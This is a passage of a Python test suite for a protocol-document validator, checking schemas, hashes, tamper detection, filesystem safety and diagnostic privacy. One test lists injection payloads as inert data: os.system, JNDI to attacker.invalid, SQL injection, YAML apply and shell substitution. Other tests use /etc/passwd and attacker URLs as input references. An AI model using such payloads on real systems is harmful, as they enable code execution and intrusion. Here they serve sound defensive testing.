            "2026-07-15 09:00:00Z",
            "2026-07-15T09:00:00",
        ):
            with self.subTest(stamp=stamp):
                with self.assertRaises(protocols.ProtocolError):
                    protocols.validate_document(work_spec(created_at=stamp))

    def test_the_aos_clock_emits_a_valid_protocol_timestamp(self):
        """utils.utc_now_iso() is the one clock; its shape IS the protocol's.

        expires_at is pushed far past the fixture default: with the REAL
        clock as created_at, the fixture's fixed 2026 expiry would otherwise
        turn this into a time bomb that starts refusing the day it passes.
        """
        from agentic_os import utils

        protocols.validate_document(
            work_spec(
                created_at=utils.utc_now_iso(),
                expires_at="2099-01-01T00:00:00Z",
            )
        )

    def test_retry_deadline_must_be_a_real_instant(self):
        self.assertRefuses(
            "invalid_timestamp",
            protocols.validate_document,
            work_spec(retry={"max_attempts": 1, "deadline_at": "2026-02-30T00:00:00Z"}),
        )


class IdentityFormatTests(ReasonCase):
    def test_trace_id_format_enforces(self):
        """Length bounds fire before the pattern — a deliberate, fixed order,
        so each case asserts the code it actually earns."""
        for bad, code in (
            ("4BF92F3577B34DA6A3CE929D0E0E4736", "pattern_mismatch"),  # upper hex
            ("z" * 32, "pattern_mismatch"),  # right length, not hex
            ("abc", "too_short"),
            ("a" * 31, "too_short"),
            ("a" * 33, "too_long"),
        ):
            with self.subTest(trace_id=bad):
                self.assertRefuses(
                    code,
                    protocols.validate_document,
                    work_spec(trace=dict(TRACE, trace_id=bad)),
                )

    def test_all_zero_trace_id_refuses(self):
        self.assertRefuses(
            "pattern_mismatch",
            protocols.validate_document,
            work_spec(trace=dict(TRACE, trace_id="0" * 32)),
        )

    def test_correlation_and_causation_must_be_uuids(self):
        self.assertRefuses(
            "too_short",
            protocols.validate_document,
            work_spec(trace=dict(TRACE, correlation_id="not-a-uuid")),
        )
        # Right length, wrong shape: reaches the pattern check.
        self.assertRefuses(
            "pattern_mismatch",
            protocols.validate_document,
            work_spec(trace=dict(TRACE, correlation_id="x" * 36)),
        )
        # Uppercase hex is refused: the canonical UUID form is lowercase, and
        # two spellings of one id would defeat correlation.
        self.assertRefuses(
            "pattern_mismatch",
            protocols.validate_document,
            work_spec(trace=dict(TRACE, causation_id="0F1E2D3C-4B5A-4998-8877-665544332211")),
        )

    def test_causation_id_is_optional(self):
        protocols.validate_document(
            work_spec(trace=dict(TRACE, causation_id="0f1e2d3c-4b5a-4998-8877-665544332299"))
        )

    def test_trace_requires_trace_id_and_correlation_id(self):
        self.assertRefuses(
            "missing_field",
            protocols.validate_document,
            work_spec(trace={"trace_id": TRACE["trace_id"]}),
        )

    def test_idempotency_key_format_enforces(self):
        for bad in ("short", "-leading", "x" * 129, "has space"):
            with self.subTest(key=bad):
                with self.assertRaises(protocols.ProtocolError):
                    protocols.validate_document(work_spec(idempotency_key=bad))

    def test_issuer_format_enforces(self):
        for bad in ("A", "Runtime.Local", "x", "-x", "x" * 65):
            with self.subTest(issuer=bad):
                with self.assertRaises(protocols.ProtocolError):
                    protocols.validate_document(work_spec(issuer=bad))


class TaskIdentityTests(ReasonCase):
    """(14) AOS task ids and runtime task UUIDs are different namespaces."""

    def test_a_runtime_uuid_is_refused_in_the_aos_task_id_field(self):
        # A UUID is 36 chars; the AOS id field is bounded at 21, so the length
        # bound refuses it before the pattern ever runs. Both are refusals.
        self.assertRefuses(
            "too_long",
            protocols.validate_document,
            work_spec(aos_task_id="aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee"),
        )
        self.assertRefuses(
            "pattern_mismatch",
            protocols.validate_document,
            work_spec(aos_task_id="aaaaaaaa-bbbb-4ccc"),
        )

    def test_an_aos_task_id_is_refused_in_the_runtime_uuid_field(self):
        self.assertRefuses(
            "too_short",
            protocols.validate_document,
            work_spec(runtime_task_uuid="T-0002"),
        )
        self.assertRefuses(
            "pattern_mismatch",
            protocols.validate_document,
            work_spec(runtime_task_uuid="T-0002" + "x" * 30),
        )

    def test_the_two_fields_are_distinct_and_independently_optional(self):
        schema = protocols.REGISTRY["beast.work-spec/v1"].schema
        self.assertIn("aos_task_id", schema["required"])
        self.assertNotIn("runtime_task_uuid", schema["required"])
        document = work_spec()
        del document["runtime_task_uuid"]
        protocols.validate_document(seal(document))

    def test_the_aos_task_id_grammar_agrees_with_the_ledger_parser(self):
        """Compatible, not broadened: every id the protocol accepts is one the
        existing ids.parse_id() accepts."""
        for value in ("T-1", "T-0002", "T-9999", f"T-{ids.MAX_ID}"):
            with self.subTest(value=value):
                protocols.validate_document(work_spec(aos_task_id=value))
                self.assertGreater(ids.parse_id(value, "task"), 0)

    def test_an_id_the_ledger_rejects_is_rejected_here_too(self):
        for value in ("R-0001", "T-", "E-0001", "T-0002x"):
            with self.subTest(value=value):
                with self.assertRaises(protocols.ProtocolError):
                    protocols.validate_document(work_spec(aos_task_id=value))
                with self.assertRaises(AosError):
                    ids.parse_id(value, "task")

    def test_the_protocol_grammar_is_a_strict_narrowing_of_the_ledger_parser(self):
        """The ledger's parse_id() is lenient at the CLI boundary: it upper-cases
        the prefix and strips surrounding whitespace, so `t-0002` and `'T-0002 '`
        are both T-2 to it. The protocol refuses both.

        That direction is the safe one and it is deliberate. On a wire format
        every id has exactly one spelling, because two spellings of one id are
        two idempotency keys, two correlation targets and two audit trails.
        Narrowing is compatible with the ledger; broadening would not be.
        """
        for lenient in ("t-0002", "T-0002 ", " T-0002", "\tT-0002\n"):
            with self.subTest(value=lenient):
                # The ledger accepts it...
                self.assertEqual(ids.parse_id(lenient, "task"), 2)
                # ...and the protocol does not.
                with self.assertRaises(protocols.ProtocolError):
                    protocols.validate_document(work_spec(aos_task_id=lenient))

        # And every id the protocol DOES accept, the ledger accepts identically.
        for strict in ("T-1", "T-0002", "T-9999"):
            with self.subTest(value=strict):
                protocols.validate_document(work_spec(aos_task_id=strict))
                self.assertEqual(
                    ids.render_id("task", ids.parse_id(strict, "task")),
                    f"T-{int(strict[2:]):04d}",
                )


class VocabularyReuseTests(unittest.TestCase):
    """(D-v0.3.10) Existing vocabularies are reused exactly, or not at all."""

    def test_result_outcome_enum_is_the_production_run_outcomes_tuple(self):
        schema = protocols.REGISTRY["beast.result-envelope/v1"].schema
        self.assertEqual(
            schema["properties"]["outcome"]["enum"], list(models.RUN_OUTCOMES)
        )

    def test_evidence_kind_enum_is_the_production_evidence_kinds_tuple(self):
        for identity in ("beast.result-envelope/v1", "beast.work-spec/v1"):
            schema = protocols.REGISTRY[identity].schema
            self.assertEqual(
                schema["$defs"]["EvidenceRef"]["properties"]["kind"]["enum"],
                list(models.EVIDENCE_KINDS),
            )

    def test_no_existing_vocabulary_is_broadened(self):
        envelope = protocols.REGISTRY["beast.result-envelope/v1"].schema
        self.assertEqual(
            set(envelope["properties"]["outcome"]["enum"]) - set(models.RUN_OUTCOMES),
            set(),
        )
        self.assertEqual(
            set(envelope["$defs"]["EvidenceRef"]["properties"]["kind"]["enum"])
            - set(models.EVIDENCE_KINDS),
            set(),
        )

    def test_project_scope_is_a_bounded_narrowing_of_the_ledger_slug(self):
        for value in ("demo", "a", "proj-1.2_3"):
            with self.subTest(value=value):
                protocols.validate_document(work_spec(scope={"project": value}))
                self.assertTrue(models.SLUG_RE.match(value))
        for value in ("Demo", "-x", "x" * 65):
            with self.subTest(value=value):
                with self.assertRaises(protocols.ProtocolError):
                    protocols.validate_document(work_spec(scope={"project": value}))

    def test_evidence_provenance_agrees_with_the_ledger_grammar(self):
        for value in ("human", "agent:claude-code"):
            with self.subTest(value=value):
                self.assertTrue(models.PROVENANCE_RE.match(value))
                spec = work_spec()
                protocols.validate_document(
                    result_envelope(
                        spec,
                        evidence=[
                            {
                                "kind": "note",
                                "ref": "r",
                                "claim": "c",
                                "provenance": value,
                            }
                        ],
                    )
                )


# ---------------------------------------------------------------------------
# (15)(16)(17) Valid artifacts and binding


class ValidArtifactTests(ReasonCase):
    def test_valid_work_spec_verifies(self):
        entry = protocols.validate_document(work_spec())
        self.assertEqual(entry.identity, "beast.work-spec/v1")

    def test_valid_work_spec_verifies_from_bytes(self):
        document, entry = protocols.validate_bytes(to_bytes(work_spec()))
        self.assertEqual(entry.identity, "beast.work-spec/v1")
        self.assertEqual(document["goal"], work_spec()["goal"])

    def test_a_fully_populated_work_spec_verifies(self):
        document = work_spec(
            constraints=["Standard library only"],
            required_capabilities=["python", "git"],
            inputs=[
                {"ref_kind": "task", "ref": "T-0002", "note": "the ledger task"},
                {"ref_kind": "file", "ref": "a.py", "sha256": "a" * 64},
            ],
            policy_refs={
                "policy_ref": "policy.default/v1",
                "approval_ref": "approval.abc/v2",
                "budget_ref": "budget.default/v1",
            },
            retry={"max_attempts": 3, "deadline_at": "2026-07-16T00:00:00Z"},
        )
        self.assertEqual(
            protocols.validate_document(document).identity, "beast.work-spec/v1"
        )

    def test_valid_result_envelope_verifies_and_binds_to_the_exact_hash(self):
        spec = work_spec()
        envelope = result_envelope(spec)
        self.assertEqual(
            protocols.validate_document(envelope).identity, "beast.result-envelope/v1"
        )
        self.assertEqual(
            envelope["work_spec_sha256"], protocols.content_digest(spec)
        )
        protocols.verify_binding(envelope, spec)

    def test_valid_interrupt_verifies_and_binds_to_an_exact_hash(self):
        spec = work_spec()
        artifact = interrupt(spec)
        self.assertEqual(
            protocols.validate_document(artifact).identity, "beast.interrupt/v1"
        )
        protocols.verify_binding(artifact, spec)

    def test_an_interrupt_binds_to_a_result_envelope_too(self):
        envelope = result_envelope()
        artifact = interrupt(envelope)
        protocols.validate_document(artifact)
        protocols.verify_binding(artifact, envelope)

    def test_every_interrupt_kind_verifies(self):
        for kind in protocols.INTERRUPT_KINDS:
            with self.subTest(kind=kind):
                protocols.validate_document(interrupt(kind=kind))

    def test_every_outcome_verifies(self):
        for outcome in models.RUN_OUTCOMES:
            with self.subTest(outcome=outcome):
                protocols.validate_document(result_envelope(outcome=outcome))

    def test_a_result_envelope_carrying_bounded_errors_verifies(self):
        document = result_envelope(
            outcome="fail",
            retryable=True,
            errors=[{"code": "tool_timeout", "message": "The tool timed out.",
                     "retryable": True}],
            compensation={"state": "not_required"},
        )
        protocols.validate_document(document)


class BindingTests(ReasonCase):
    def test_a_tampered_work_spec_breaks_the_binding(self):
        spec = work_spec()
        envelope = result_envelope(spec)
        other = work_spec(goal="A different goal entirely.")
        self.assertRefuses("binding_mismatch", protocols.verify_binding, envelope, other)

    def test_binding_refuses_a_referent_of_the_wrong_schema(self):
        envelope = result_envelope()
        self.assertRefuses(
            "binding_mismatch", protocols.verify_binding, envelope, result_envelope()
        )

    def test_binding_refuses_when_the_ids_disagree_despite_a_matching_hash(self):
        spec = work_spec()
        envelope = result_envelope(spec)
        envelope = seal(
            dict(envelope, work_spec_id="deadbeef-0000-4000-8000-000000000000")
        )
        self.assertRefuses("binding_mismatch", protocols.verify_binding, envelope, spec)

    def test_binding_recomputes_the_referent_digest_rather_than_trusting_it(self):
        """The referent's own content_sha256 is the field an attacker edits."""
        spec = work_spec()
        envelope = result_envelope(spec)
        forged = dict(spec, goal="Something else.")
        forged[protocols.CONTENT_HASH_FIELD] = spec[protocols.CONTENT_HASH_FIELD]
        self.assertRefuses("binding_mismatch", protocols.verify_binding, envelope, forged)

    def test_an_interrupt_subject_schema_must_match_the_referent(self):
        spec = work_spec()
        artifact = seal(
            dict(interrupt(spec), subject_schema="beast.result-envelope/v1")
        )
        self.assertRefuses("binding_mismatch", protocols.verify_binding, artifact, spec)

    def test_binding_is_not_defined_for_a_work_spec(self):
        self.assertRefuses(
            "binding_mismatch", protocols.verify_binding, work_spec(), work_spec()
        )


# ---------------------------------------------------------------------------
# (18)(19)(20) Tamper detection


class TamperTests(ReasonCase):
    def test_payload_tampering_causes_hash_failure(self):
        for field, value in (
            ("goal", "A different goal."),
            ("acceptance_criteria", ["Something else"]),
        ):
            with self.subTest(field=field):
                document = dict(work_spec(), **{field: value})
                self.assertRefuses(
                    "hash_mismatch", protocols.validate_document, document
                )

    def test_metadata_tampering_causes_hash_failure(self):
        for field, value in (
            ("created_at", "2026-07-15T09:00:01Z"),
            ("issuer", "attacker.local"),
            ("audience", ["attacker.local"]),
            ("idempotency_key", "ws-2026-07-15-9999"),
            ("data_classification", "public"),
            ("aos_task_id", "T-0003"),
            ("protocol_version", 1),
        ):
            with self.subTest(field=field):
                document = dict(work_spec(), **{field: value})
                if field == "protocol_version":
                    # Unchanged value: proves the fixture is honest, i.e. the
                    # other cases fail because of the CHANGE, not by default.
                    protocols.validate_document(document)
                    continue
                self.assertRefuses(
                    "hash_mismatch", protocols.validate_document, document
                )

    def test_scope_tampering_causes_hash_failure(self):
        document = dict(work_spec(), scope={"project": "other"})
        self.assertRefuses("hash_mismatch", protocols.validate_document, document)

    def test_schema_identity_tampering_causes_hash_failure(self):
        """The schema field is inside the hashed body, so retargeting an
        artifact at another schema cannot survive."""
        spec = work_spec()
        document = dict(spec, schema="beast.interrupt/v1")
        with self.assertRaises(protocols.ProtocolError) as caught:
            protocols.validate_document(document)
        self.assertIn(caught.exception.code, ("unknown_field", "missing_field"))

        envelope = result_envelope()
        retargeted = dict(envelope, schema="beast.work-spec/v1")
        with self.assertRaises(protocols.ProtocolError):
            protocols.validate_document(retargeted)

    def test_a_removed_field_is_caught(self):
        document = {k: v for k, v in work_spec().items() if k != "goal"}
        self.assertRefuses("missing_field", protocols.validate_document, document)

    def test_a_removed_optional_field_causes_hash_failure(self):
        """Not required, so structure still passes — the hash is what catches it."""
        document = {k: v for k, v in work_spec().items() if k != "expires_at"}
        self.assertRefuses("hash_mismatch", protocols.validate_document, document)

    def test_hash_substitution_from_another_valid_document_refuses(self):
        spec = work_spec()
        other = work_spec(goal="Another goal.")
        document = dict(spec)
        document[protocols.CONTENT_HASH_FIELD] = other[protocols.CONTENT_HASH_FIELD]
        self.assertRefuses("hash_mismatch", protocols.validate_document, document)

    def test_malformed_hashes_refuse(self):
        for bad in (
            "",
            "abc",
            "A" * 64,
            "0" * 63,
            "0" * 65,
            "g" * 64,
            "0" * 64 + "\n",
            "07AC96BA08A1579BBD681AB4087156E9D8FACF849F3348E0E494658F3ACCEAB9",
        ):
            with self.subTest(value=bad):
                document = dict(work_spec())
                document[protocols.CONTENT_HASH_FIELD] = bad
                self.assertRefuses(
                    "malformed_hash", protocols.validate_document, document
                )

    def test_a_non_string_hash_refuses(self):
        for bad in (None, 1, [], {}):
            with self.subTest(value=bad):
                document = dict(work_spec())
                document[protocols.CONTENT_HASH_FIELD] = bad
                self.assertRefuses(
                    "malformed_hash", protocols.validate_document, document
                )

    def test_unknown_hashing_version_refuses(self):
        for bad in ("aos-sha256-canonical/v2", "sha256", "md5", "", None):
            with self.subTest(value=bad):
                document = dict(work_spec(), content_hash_alg=bad)
                self.assertRefuses(
                    "unknown_hash_alg", protocols.validate_document, document
                )

    def test_the_hash_excludes_exactly_its_own_top_level_field(self):
        body = {k: v for k, v in work_spec().items()
                if k != protocols.CONTENT_HASH_FIELD}
        with_any_hash = dict(body)
        with_any_hash[protocols.CONTENT_HASH_FIELD] = "f" * 64
        self.assertEqual(
            protocols.content_digest(with_any_hash), protocols.content_digest(body)
        )

    def test_a_nested_content_sha256_is_body_content_and_is_not_excluded(self):
        base = {"a": 1, "nested": {"content_sha256": "a" * 64}}
        other = {"a": 1, "nested": {"content_sha256": "b" * 64}}
        self.assertNotEqual(
            protocols.content_digest(base), protocols.content_digest(other)
        )

    def test_the_digest_is_independent_of_input_layout(self):
        document = work_spec()
        compact = json.dumps(document, separators=(",", ":"), sort_keys=True).encode()
        pretty = json.dumps(document, indent=4).encode()
        reordered = json.dumps(dict(reversed(list(document.items())))).encode()
        digests = {
            protocols.content_digest(protocols.parse_canonical(raw))
            for raw in (compact, pretty, reordered)
        }
        self.assertEqual(digests, {document[protocols.CONTENT_HASH_FIELD]})


# ---------------------------------------------------------------------------
# (21)(22) Inertness: no execution, no dereferencing


class NoExecutionTests(ReasonCase):
    PAYLOADS = (
        "__import__('os').system('touch /tmp/aos-x1-pwned')",
        "${jndi:ldap://attacker.invalid/x}",
        "{{7*7}}",
        "'; DROP TABLE tasks; --",
        "!!python/object/apply:os.system ['touch /tmp/aos-x1-pwned']",
        "$(touch /tmp/aos-x1-pwned)",
        "`touch /tmp/aos-x1-pwned`",
    )

    def test_validation_never_executes_artifact_content(self):
        canary = Path(tempfile.gettempdir()) / "aos-x1-pwned"
        if canary.exists():
            canary.unlink()
        for payload in self.PAYLOADS:
            with self.subTest(payload=payload[:24]):
                document = work_spec(goal=payload, acceptance_criteria=[payload])
                entry = protocols.validate_document(document)
                self.assertEqual(entry.identity, "beast.work-spec/v1")
                # The value survives byte-identically: it was data throughout.
                self.assertEqual(document["goal"], payload)
        self.assertFalse(canary.exists(), "artifact content executed")

    def test_the_production_module_contains_no_dynamic_execution_primitive(self):
        import re as _re

        source = (REPO_ROOT / "agentic_os" / "protocols.py").read_text()
        for primitive in (
            "eval", "exec", "__import__", "importlib", "subprocess",
            "pickle", "marshal", "yaml", "system", "popen", "spawn",
        ):
            with self.subTest(primitive=primitive):
                # Word-boundary matching, and re.compile is explicitly exempt:
                # compiling a regex from a schema-authored pattern is not
                # dynamic execution of artifact content.
                hits = [
                    m.group(0)
                    for m in _re.finditer(rf"\b{primitive}\s*\(", source)
                    if not source[: m.start()].endswith("re.")
                ]
                self.assertEqual(hits, [], f"{primitive} appears in protocols.py")

    def test_the_only_compile_call_is_a_regex_compile(self):
        import re as _re

        source = (REPO_ROOT / "agentic_os" / "protocols.py").read_text()
        for match in _re.finditer(r"\bcompile\s*\(", source):
            prefix = source[: match.start()]
            self.assertTrue(
                prefix.endswith("re."), "a non-regex compile() call appeared"
            )

    def test_the_production_module_imports_no_network_or_import_machinery(self):
        source = (REPO_ROOT / "agentic_os" / "protocols.py").read_text()
        for module in ("urllib", "http", "socket", "requests", "ftplib"):
            with self.subTest(module=module):
                self.assertNotIn(f"import {module}", source)

    def test_validation_touches_no_filesystem_at_all(self):
        """validate_document works on already-parsed data: any open/stat here
        would be the validator following something it read."""
        document = work_spec(
            inputs=[
                {"ref_kind": "file", "ref": "/etc/passwd"},
                {"ref_kind": "url", "ref": "https://attacker.invalid/payload"},
                {"ref_kind": "file", "ref": str(REPO_ROOT / "aos.py"),
                 "sha256": "a" * 64},
            ]
        )
        boom = AssertionError("validation touched the filesystem")
        with mock.patch("os.open", side_effect=boom), mock.patch(
            "builtins.open", side_effect=boom
        ), mock.patch("os.stat", side_effect=boom), mock.patch(
            "os.lstat", side_effect=boom
        ), mock.patch("io.open", side_effect=boom):
            entry = protocols.validate_document(document)
        self.assertEqual(entry.identity, "beast.work-spec/v1")

    def test_a_declared_sha256_is_never_verified_against_a_real_file(self):
        """Hashing a path an untrusted artifact chose is a read primitive
        handed to the artifact's author (contract §3.4)."""
        with tempfile.TemporaryDirectory() as tmp:
            target = Path(tmp) / "secret.txt"
            target.write_text("classified")
            document = work_spec(
                inputs=[{"ref_kind": "file", "ref": str(target), "sha256": "0" * 64}]
            )
            # The declared hash is deliberately wrong for the real file, and
            # validation passes anyway: the reference is inert.
            protocols.validate_document(document)
            self.assertEqual(target.read_text(), "classified")

    def test_an_input_reference_naming_a_fifo_is_never_opened(self):
        """A FIFO blocks forever on open. Passing this test IS the proof that
        the reference was not followed."""
        if not hasattr(os, "mkfifo"):
            self.skipTest("platform has no FIFO support")
        with tempfile.TemporaryDirectory() as tmp:
            fifo = Path(tmp) / "trap.fifo"
            os.mkfifo(fifo)
            document = work_spec(inputs=[{"ref_kind": "file", "ref": str(fifo)}])
            protocols.validate_document(document)

    def test_a_url_reference_is_never_fetched(self):
        document = work_spec(
            inputs=[{"ref_kind": "url", "ref": "http://127.0.0.1:1/never"}]
        )
        with mock.patch("socket.socket", side_effect=AssertionError("network!")):
            protocols.validate_document(document)


# ---------------------------------------------------------------------------
# (23) Filesystem safety


class UnsafeInputTests(ReasonCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="aos-x1-fs-"))
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.valid = self.tmp / "valid.json"
        self.valid.write_bytes(to_bytes(work_spec()))

    def test_a_regular_file_is_accepted(self):
        _document, entry = protocols.load_artifact_file(self.valid)
        self.assertEqual(entry.identity, "beast.work-spec/v1")

    def test_symlink_refuses_and_the_target_is_not_read(self):
        link = self.tmp / "link.json"
        link.symlink_to(self.valid)
        error = self.assertRefuses("unsafe_input", protocols.read_artifact_bytes, link)
        self.assertIn("a symlink", str(error))
        self.assertTrue(self.valid.is_file())

    def test_dangling_symlink_refuses_as_a_symlink_not_as_missing(self):
        link = self.tmp / "dangling.json"
        link.symlink_to(self.tmp / "nope.json")
        self.assertRefuses("unsafe_input", protocols.read_artifact_bytes, link)

    def test_directory_refuses(self):
        directory = self.tmp / "adir"
        directory.mkdir()
        error = self.assertRefuses(
            "unsafe_input", protocols.read_artifact_bytes, directory
        )
        self.assertIn("a directory", str(error))

    def test_fifo_refuses_without_blocking(self):
        if not hasattr(os, "mkfifo"):
            self.skipTest("platform has no FIFO support")
        fifo = self.tmp / "a.fifo"
        os.mkfifo(fifo)
        error = self.assertRefuses("unsafe_input", protocols.read_artifact_bytes, fifo)
        self.assertIn("a FIFO", str(error))

    def test_socket_refuses(self):
        path = self.tmp / "a.sock"
        server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.addCleanup(server.close)
        server.bind(str(path))
        error = self.assertRefuses("unsafe_input", protocols.read_artifact_bytes, path)
        self.assertIn("a socket", str(error))

    def test_character_device_refuses(self):
        device = Path("/dev/null")
        if not device.exists() or not stat.S_ISCHR(os.lstat(device).st_mode):
            self.skipTest("no character device available")
        error = self.assertRefuses(
            "unsafe_input", protocols.read_artifact_bytes, device
        )
        self.assertIn("a character device", str(error))

    def test_a_missing_file_refuses(self):
        self.assertRefuses(
            "unreadable", protocols.read_artifact_bytes, self.tmp / "nope.json"
        )

    def test_an_oversized_file_refuses_before_being_read(self):
        big = self.tmp / "big.json"
        big.write_bytes(b"x" * (protocols.MAX_ARTIFACT_BYTES + 1))
        opened = []
        real_open = os.open

        def spy(path, *args, **kwargs):
            opened.append(str(path))
            return real_open(path, *args, **kwargs)

        with mock.patch("os.open", side_effect=spy):
            self.assertRefuses("too_large", protocols.read_artifact_bytes, big)
        self.assertEqual(opened, [], "the oversized file was opened before bounding")

    def test_a_file_that_changes_identity_between_check_and_read_refuses(self):
        real_lstat = os.lstat

        class Fake:
            def __init__(self, st):
                self.st_mode = st.st_mode
                self.st_size = st.st_size
                self.st_dev = st.st_dev
                self.st_ino = st.st_ino + 1  # a different file

        with mock.patch("os.lstat", side_effect=lambda p: Fake(real_lstat(p))):
            self.assertRefuses(
                "file_changed_during_read", protocols.read_artifact_bytes, self.valid
            )

    def test_a_file_that_changes_size_between_check_and_read_refuses(self):
        real_lstat = os.lstat

        class Fake:
            def __init__(self, st):
                self.st_mode = st.st_mode
                self.st_size = st.st_size + 1
                self.st_dev = st.st_dev
                self.st_ino = st.st_ino

        with mock.patch("os.lstat", side_effect=lambda p: Fake(real_lstat(p))):
            self.assertRefuses(
                "file_changed_during_read", protocols.read_artifact_bytes, self.valid
            )

    def test_reading_never_writes_the_input_or_creates_a_neighbour(self):
        before_bytes = self.valid.read_bytes()
        before_stat = os.lstat(self.valid)
        before_listing = sorted(p.name for p in self.tmp.iterdir())

        protocols.load_artifact_file(self.valid)
        try:
            protocols.load_artifact_file(self.tmp / "nope.json")
        except protocols.ProtocolError:
            pass

        self.assertEqual(self.valid.read_bytes(), before_bytes)
        self.assertEqual(os.lstat(self.valid).st_mtime_ns, before_stat.st_mtime_ns)
        self.assertEqual(sorted(p.name for p in self.tmp.iterdir()), before_listing)


# ---------------------------------------------------------------------------
# (24) Privacy of diagnostics


class DiagnosticPrivacyTests(unittest.TestCase):
    SECRET = "sk-live-51H8ZfLkQwErTyUiOpAsDfGhJkLzXcVbNm0987654321"

    def _errors_for(self, documents):
        """Every refusal message this suite can provoke from a planted doc."""
        messages = []
        for document in documents:
            try:
                protocols.validate_document(document)
            except AosError as exc:
                messages.append(str(exc))
        return messages

    def test_diagnostics_never_echo_a_planted_secret(self):
        planted = [
            work_spec(goal=self.SECRET, expires_at="2020-01-01T00:00:00Z"),
            dict(work_spec(goal=self.SECRET), issuer="NOPE"),
            dict(work_spec(goal=self.SECRET), data_classification="nope"),
            dict(work_spec(goal=self.SECRET), aos_task_id="nope"),
            dict(work_spec(goal=self.SECRET), unknown_field_here=self.SECRET),
            dict(work_spec(goal=self.SECRET), content_hash_alg="md5"),
            dict(work_spec(goal=self.SECRET), schema="nope.thing/v1"),
        ]
        messages = self._errors_for(planted)
        self.assertEqual(len(messages), len(planted), "a planted doc did not refuse")
        for message in messages:
            self.assertNotIn(self.SECRET, message)
            self.assertNotIn("sk-live", message)

    def test_diagnostics_never_echo_a_field_value(self):
        document = dict(work_spec(), issuer="TOTALLY-DISTINCTIVE-VALUE")
        with self.assertRaises(AosError) as caught:
            protocols.validate_document(document)
        self.assertNotIn("TOTALLY-DISTINCTIVE-VALUE", str(caught.exception))

    def test_an_unknown_field_name_is_not_echoed_back(self):
        """The attacker chooses the key; it must not reach the terminal."""
        document = seal(dict(work_spec(), **{"x-DISTINCTIVE-KEY": 1}))
        with self.assertRaises(AosError) as caught:
            protocols.validate_document(document)
        self.assertNotIn("DISTINCTIVE-KEY", str(caught.exception))

    def test_every_diagnostic_is_exactly_one_line(self):
        planted = [
            dict(work_spec(), issuer="NOPE"),
            dict(work_spec(), goal="x" * 5000),
            dict(work_spec(), schema="nope.thing/v1"),
            work_spec(created_at="2026-02-30T00:00:00Z"),
        ]
        for message in self._errors_for(planted):
            self.assertEqual(len(message.splitlines()), 1, message)

    def test_diagnostics_carry_a_declared_reason_code_and_a_safe_path(self):
        document = dict(work_spec(), issuer="NOPE")
        with self.assertRaises(protocols.ProtocolError) as caught:
            protocols.validate_document(document)
        self.assertEqual(caught.exception.code, "pattern_mismatch")
        self.assertEqual(caught.exception.path, "/issuer")
        self.assertIn("[pattern_mismatch]", str(caught.exception))

    def test_no_reason_code_can_be_invented_at_a_call_site(self):
        with self.assertRaises(KeyError):
            protocols.ProtocolError("made_up_code", "/")

    def test_every_declared_reason_code_has_a_value_free_hint(self):
        for code, hint in protocols.REASON_HINTS.items():
            with self.subTest(code=code):
                self.assertTrue(hint.strip())
                self.assertEqual(len(hint.splitlines()), 1)

    def test_file_diagnostics_name_a_basename_and_never_an_absolute_path(self):
        with tempfile.TemporaryDirectory() as tmp:
            directory = Path(tmp) / "sensitive-dir-name"
            directory.mkdir()
            with self.assertRaises(protocols.ProtocolError) as caught:
                protocols.read_artifact_bytes(directory)
            message = str(caught.exception)
            self.assertIn("sensitive-dir-name", message)
            self.assertNotIn(tmp, message)
            self.assertNotIn(str(directory), message)

    def test_the_cli_keeps_stdout_empty_and_stderr_secret_free_on_failure(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "bad.json"
            path.write_bytes(to_bytes(dict(work_spec(goal=self.SECRET), issuer="NOPE")))
            result = _run(
                [sys.executable, str(REPO_ROOT / "aos.py"), "protocol", "validate",
                 str(path)],
                tmp,
            )
            self.assertEqual(result.returncode, 1)
            self.assertEqual(result.stdout, "")
            self.assertNotIn(self.SECRET, result.stderr)
            self.assertEqual(len(result.stderr.strip().splitlines()), 1)


# ---------------------------------------------------------------------------
# (25)(26)(27) Classification and isolation


class ClassificationTests(unittest.TestCase):
    def test_all_five_protocol_leaves_are_classified_read_only(self):
        for path in PROTOCOL_LEAVES:
            with self.subTest(path=path):
                policy = power.COMMAND_POLICY[path]
                self.assertEqual(policy.kind, power.READ_ONLY)
                self.assertFalse(policy.ledger)

    def test_the_parser_exposes_exactly_these_five_protocol_leaves(self):
        leaves = {
            path
            for path in power.iter_command_paths(cli.build_parser())
            if path and path[0] == "protocol"
        }
        self.assertEqual(leaves, set(PROTOCOL_LEAVES))

    def test_protocol_leaves_are_allowed_in_recovery_mode(self):
        for path in PROTOCOL_LEAVES:
            with self.subTest(path=path):
                self.assertIn(
                    power.policy_for(path).kind, power.RECOVERY_ALLOWED_KINDS
                )


class IsolationTests(unittest.TestCase):
    """(26)(27) No SQLite, no workspace state, no power.json, no events."""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="aos-x1-iso-"))
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.artifact = self.tmp / "ws.json"
        self.artifact.write_bytes(to_bytes(work_spec()))

    def _invocations(self):
        return (
            ["protocol", "list"],
            ["protocol", "list", "--json"],
            ["protocol", "show", "beast.work-spec/v1"],
            ["protocol", "validate", str(self.artifact)],
            ["protocol", "digest", str(self.artifact)],
            ["protocol", "verify-registry"],
        )

    def test_protocol_commands_do_not_open_sqlite(self):
        boom = AssertionError("a protocol command opened SQLite")
        for argv in self._invocations():
            with self.subTest(argv=argv):
                with mock.patch("sqlite3.connect", side_effect=boom), mock.patch(
                    "agentic_os.db.open_db", side_effect=boom
                ), contextlib_chdir(self.tmp):
                    with mock.patch("sys.stdout"):
                        self.assertEqual(cli.main(argv), 0)

    def test_protocol_commands_do_not_open_sqlite_inside_a_real_workspace(self):
        """The riskier case: a workspace IS in scope, so a careless _ledger()
        would succeed silently instead of failing loudly."""
        workspace = self.tmp / "ws"
        workspace.mkdir()
        init = _run([sys.executable, str(REPO_ROOT / "aos.py"), "init"], workspace)
        self.assertEqual(init.returncode, 0, init.stderr)
        db_path = workspace / ".agentic-os" / "aos.db"
        self.assertTrue(db_path.is_file())
        before = db_path.read_bytes()

        boom = AssertionError("a protocol command opened SQLite")
        for argv in self._invocations():
            with self.subTest(argv=argv):
                with mock.patch("sqlite3.connect", side_effect=boom), contextlib_chdir(
                    workspace
                ):
